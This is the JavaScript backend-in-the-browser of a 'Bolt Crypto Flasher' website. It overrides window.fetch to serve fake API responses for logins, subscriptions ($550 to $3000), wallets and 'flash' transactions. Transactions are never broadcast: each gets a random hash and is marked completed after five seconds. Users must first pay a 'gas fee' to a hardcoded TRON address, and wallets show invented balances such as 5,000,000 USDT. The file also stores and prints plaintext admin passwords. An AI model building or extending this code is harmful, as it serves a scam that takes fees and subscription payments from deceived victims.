// Bolt Crypto Flasher - Static Website Embedded API Server
// Properly integrated with fetch override - August 3, 2025

console.log('🚀 Loading Bolt Crypto Flasher API Server...');

// Mock storage for static deployment with all latest fixes
class StaticStorage {
  constructor() {
    // Admin users with correct credentials
    this.users = [
      {
        id: "56bd331d-6d44-4145-9005-f2c2ade93cd8",
        username: "admin",
        email: "admin@bolt.com",
        password: "usdt123",
        firstName: "Admin",
        lastName: "User",
        role: "admin",
        isActive: true,
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString()
      },
      {
        id: "272171a5-8f87-43bc-a14b-c9dab156baa0",
        username: "SoftwareHenry",
        email: "henry@bolt.com", 
        password: "Rmabuw190",
        firstName: "Software",
        lastName: "Henry",
        role: "admin",
        isActive: true,
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString()
      }
    ];

    // Subscription plans
    this.subscriptionPlans = [
      {
        id: "b103965e-2eba-455d-8e97-1e565c2834a7",
        name: "Basic",
        price: "550",
        features: [
          "Flash Transactions",
          "Multi-Network Support", 
          "24/7 Support",
          "Basic Dashboard",
          "Transaction History"
        ],
        createdAt: new Date().toISOString()
      },
      {
        id: "a7f3b821-4c92-4d88-b8e1-9a5c4b2f1d83",
        name: "Pro",
        price: "950", 
        features: [
          "All Basic Features",
          "Advanced Analytics",
          "Priority Support",
          "API Access",
          "Custom Integrations"
        ],
        createdAt: new Date().toISOString()
      },
      {
        id: "c9e5f7a2-8b4d-4a92-9c3e-7f1a5b8d2c94",
        name: "Full",
        price: "3000",
        features: [
          "All Pro Features", 
          "Unlimited Transactions",
          "White Label Solution",
          "Dedicated Account Manager",
          "Enterprise Support"
        ],
        createdAt: new Date().toISOString()
      }
    ];

    this.transactions = [];
    this.wallets = [
      {
        id: "wallet-btc-1",
        userId: "56bd331d-6d44-4145-9005-f2c2ade93cd8",
        name: "Bitcoin Wallet",
        address: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
        network: "BTC",
        balance: "1.23400000",
        isActive: true,
        createdAt: new Date().toISOString()
      },
      {
        id: "wallet-eth-1",
        userId: "56bd331d-6d44-4145-9005-f2c2ade93cd8",
        name: "Ethereum Wallet", 
        address: "0x742d35Cc0123456789012345678901234567890a",
        network: "ETH",
        balance: "15.67000000", 
        isActive: true,
        createdAt: new Date().toISOString()
      },
      {
        id: "wallet-usdt-1",
        userId: "56bd331d-6d44-4145-9005-f2c2ade93cd8",
        name: "USDT Wallet",
        address: "TQn9Y2khEsLJW1ChVWFMSMeRDow5oNDMnt",
        network: "TRX",
        balance: "5000000.00000000",
        isActive: true,
        createdAt: new Date().toISOString()
      }
    ];
    this.userSubscriptions = [];
  }

  // Authentication methods
  async getUserByUsername(username) {
    return this.users.find(u => u.username === username);
  }

  async getUserByEmail(email) {
    return this.users.find(u => u.email === email);
  }

  async createUser(userData) {
    const newUser = {
      id: 'user-' + Date.now() + '-' + Math.random().toString(36).substring(2),
      username: userData.username,
      email: userData.email || null,
      password: userData.password,
      firstName: userData.firstName || null,
      lastName: userData.lastName || null,
      role: 'user',
      isActive: true,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString()
    };
    this.users.push(newUser);
    
    // Create default wallets for new user
    const defaultWallets = [
      {
        id: 'wallet-btc-' + newUser.id,
        userId: newUser.id,
        name: 'Bitcoin Wallet',
        address: 'bc1q' + Math.random().toString(36).substring(2),
        network: 'BTC',
        balance: '0.00000000',
        isActive: true,
        createdAt: new Date().toISOString()
      }
    ];
    this.wallets.push(...defaultWallets);
    
    return newUser;
  }

  // Transaction methods
  async createTransaction(data) {
    const transaction = {
      id: 'tx-' + Date.now() + '-' + Math.random().toString(36).substring(2),
      userId: data.userId,
      toAddress: data.toAddress,
      amount: data.amount,
      token: data.token,
      network: data.network,
      gasFeePaid: data.gasFeePaid || false,
      flashAddress: "TQm8yS3XZHgXiHMtMWbrQwwmLCztyvAG8y",
      status: "pending",
      txHash: "0x" + Math.random().toString(36).substring(2),
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString()
    };
    this.transactions.push(transaction);
    
    // Auto-complete after 5 seconds
    setTimeout(() => {
      transaction.status = "completed";
      transaction.updatedAt = new Date().toISOString();
    }, 5000);
    
    return transaction;
  }

  async getTransactionsByUserId(userId) {
    return this.transactions.filter(t => t.userId === userId);
  }

  // Wallet methods
  async getWalletsByUserId(userId) {
    return this.wallets.filter(w => w.userId === userId);
  }

  // Market data
  getMarketData() {
    const baseData = {
      'BTC': { price: 114101, change: 0.69 },
      'ETH': { price: 3493.04, change: 0.55 },
      'USDT': { price: 1.0, change: 0.01 },
      'BNB': { price: 751.72, change: 0.33 },
      'TRX': { price: 0.326162, change: 1.48 },
      'SOL': { price: 162.45, change: 0.22 }
    };

    return Object.entries(baseData).map(([symbol, data]) => ({
      symbol,
      price: data.price * (0.98 + Math.random() * 0.04),
      change24h: data.change + (Math.random() - 0.5) * 2,
      volume24h: Math.random() * 50000000000,
      marketCap: data.price * Math.random() * 1000000000,
      timestamp: Date.now()
    }));
  }

  // Subscription methods
  getSubscriptionPlans() {
    return this.subscriptionPlans;
  }

  async createSubscription(data) {
    const subscription = {
      id: 'sub-' + Date.now(),
      userId: data.userId,
      planId: data.planId,
      status: 'active',
      paymentTxHash: data.paymentTxHash,
      createdAt: new Date().toISOString(),
      expiresAt: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString()
    };
    this.userSubscriptions.push(subscription);
    return subscription;
  }

  async getUserSubscription(userId) {
    return this.userSubscriptions.find(s => s.userId === userId && s.status === 'active');
  }

  // Admin methods
  async getUsers() {
    return this.users;
  }

  getGasReceiverAddress() {
    return "TQm8yS3XZHgXiHMtMWbrQwwmLCztyvAG8y";
  }
}

// Initialize storage
const storage = new StaticStorage();

// API endpoints with all latest fixes
const apiEndpoints = {
  // Authentication
  'POST /api/auth/login': async (body) => {
    const { username, password } = body;
    if (!username || !password) {
      return { status: 400, data: { message: "Username and password are required" } };
    }

    const user = await storage.getUserByUsername(username);
    if (!user || user.password !== password) {
      return { status: 401, data: { message: "Invalid credentials" } };
    }

    return {
      status: 200,
      data: {
        user: { id: user.id, username: user.username, email: user.email, role: user.role },
        token: `token_${user.id}`
      }
    };
  },

  'POST /api/auth/register': async (body) => {
    const { username, email, password, firstName, lastName } = body;
    
    if (!username || !password) {
      return { status: 400, data: { message: "Username and password are required" } };
    }

    const existingUser = await storage.getUserByUsername(username);
    if (existingUser) {
      return { status: 400, data: { message: "Username already exists" } };
    }

    if (email) {
      const existingEmailUser = await storage.getUserByEmail(email);
      if (existingEmailUser) {
        return { status: 400, data: { message: "Email already exists" } };
      }
    }

    const newUser = await storage.createUser({
      username, email, password, firstName, lastName
    });

    return {
      status: 200,
      data: {
        user: {
          id: newUser.id,
          username: newUser.username,
          email: newUser.email,
          firstName: newUser.firstName,
          lastName: newUser.lastName
        },
        token: `token_${newUser.id}`,
        message: "Registration successful. Please purchase a subscription to access the platform."
      }
    };
  },

  // Transaction endpoints
  'POST /api/transactions': async (body) => {
    if (!body.gasFeePaid) {
      return { status: 400, data: { message: "Gas fee payment required for all transactions" } };
    }
    const transaction = await storage.createTransaction(body);
    return { status: 200, data: transaction };
  },

  // Market data
  'GET /api/market/prices': async () => {
    return { status: 200, data: storage.getMarketData() };
  },

  // Subscriptions
  'GET /api/subscription-plans': async () => {
    return { status: 200, data: storage.getSubscriptionPlans() };
  },

  'POST /api/subscriptions': async (body) => {
    const subscription = await storage.createSubscription(body);
    return { status: 200, data: subscription };  
  },

  // Admin endpoints
  'GET /api/admin/users': async () => {
    return { status: 200, data: await storage.getUsers() };
  },

  'GET /api/admin/gas-receiver': async () => {
    return { status: 200, data: { address: storage.getGasReceiverAddress() } };
  },

  // Networks
  'GET /api/networks': async () => {
    return { status: 200, data: [] };
  },

  // Gas fees
  'GET /api/gas-fees': async () => {
    return {
      status: 200,
      data: {
        receiverAddress: storage.getGasReceiverAddress(),
        fees: {
          ethereum: { amount: "0.019", currency: "ETH" },
          bitcoin: { amount: "0.0012", currency: "BTC" },
          tron: { amount: "25", currency: "TRX" },
          bsc: { amount: "0.008", currency: "BNB" }
        }
      }
    };
  }
};

// Dynamic endpoint handler
function handleDynamicEndpoint(method, path, body) {
  // Handle user-specific endpoints
  const transactionMatch = path.match(/^\/api\/transactions\/([^\/]+)$/);
  if (transactionMatch && method === 'GET') {
    const userId = transactionMatch[1];
    return { status: 200, data: storage.getTransactionsByUserId(userId) };
  }

  const walletMatch = path.match(/^\/api\/wallets\/([^\/]+)$/);
  if (walletMatch && method === 'GET') {
    const userId = walletMatch[1];
    return { status: 200, data: storage.getWalletsByUserId(userId) };
  }

  const subscriptionMatch = path.match(/^\/api\/subscriptions\/([^\/]+)$/);
  if (subscriptionMatch && method === 'GET') {
    const userId = subscriptionMatch[1];
    const subscription = storage.getUserSubscription(userId);
    if (!subscription) {
      return { status: 404, data: { message: "No active subscription found" } };
    }
    return { status: 200, data: subscription };
  }

  return null;
}

// Main API handler
window.apiHandler = async function(method, path, body = null) {
  try {
    console.log(`API: ${method} ${path}`, body ? body : '');

    // Try dynamic endpoints first
    const dynamicResult = handleDynamicEndpoint(method, path, body);
    if (dynamicResult) {
      console.log(`API Response: ${dynamicResult.status}`, dynamicResult.data);
      return dynamicResult;
    }

    // Try static endpoints
    const endpointKey = `${method} ${path}`;
    const handler = apiEndpoints[endpointKey];
    if (handler) {
      const result = await handler(body);
      console.log(`API Response: ${result.status}`, result.data);
      return result;
    }

    console.log(`API endpoint not found: ${method} ${path}`);
    return { status: 404, data: { message: "Endpoint not found" } };

  } catch (error) {
    console.error('API Error:', error);
    return { status: 500, data: { message: "Internal server error" } };
  }
};

// Override fetch to intercept API calls
if (typeof window !== 'undefined') {
  const originalFetch = window.fetch;
  
  window.fetch = async function(url, options = {}) {
    // Intercept API calls
    if (url.startsWith('/api/') || url.includes('/api/')) {
      const method = options.method || 'GET';
      let body = null;
      
      if (options.body) {
        try {
          body = typeof options.body === 'string' ? JSON.parse(options.body) : options.body;
        } catch (e) {
          body = options.body;
        }
      }

      const path = url.startsWith('/api/') ? url : '/api/' + url.split('/api/')[1];
      const result = await window.apiHandler(method, path, body);
      
      // Return proper Response object
      return {
        ok: result.status >= 200 && result.status < 300,
        status: result.status,
        statusText: result.status >= 200 && result.status < 300 ? 'OK' : 'Error',
        headers: new Headers({'content-type': 'application/json'}),
        json: async () => result.data,
        text: async () => JSON.stringify(result.data),
        clone: function() { return this; },
        url: url,
        redirected: false,
        type: 'default',
        bodyUsed: false
      };
    }
    
    // For non-API calls, use original fetch
    return originalFetch.call(this, url, options);
  };
}

console.log('✅ Bolt Crypto Flasher API Server Ready');
console.log('🔑 Admin: admin/usdt123, SoftwareHenry/Rmabuw190');
console.log('📱 Registration with email capture enabled');
console.log('💫 Flash fee system: TQm8yS3XZHgXiHMtMWbrQwwmLCztyvAG8y');